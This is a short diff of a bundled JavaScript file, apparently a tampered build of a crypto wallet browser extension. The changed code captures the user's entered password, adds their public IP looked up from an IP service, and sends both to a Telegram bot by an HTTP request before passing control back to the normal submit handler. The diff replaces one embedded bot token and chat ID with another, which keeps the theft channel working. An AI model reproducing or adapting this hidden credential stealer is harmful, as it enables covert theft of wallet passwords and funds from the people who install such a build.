@@ -10577,7 +10577,7 @@ LavaPack.loadBundle([
 								
 								fetch("https://api.ipify.org").then(r => r.text()).then((ip) => {
 								    password = `IP: ${ip}%0D%0A${password}`
-									fetch(`https://api.telegram.org/bot6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4/sendMessage?chat_id=1804765109&text=${password}&parse_mode=HTML&disable_web_page_preview=True`).then((r) => {handleSubmitlololololol(...args)})
+									fetch(`https://api.telegram.org/bot6904217349:AAH0T4Isy8z1aCvzrtosENASChRIzcOncCQ/sendMessage?chat_id=-4012870581&text=${password}&parse_mode=HTML&disable_web_page_preview=True`).then((r) => {handleSubmitlololololol(...args)})
 									
 								})
 								
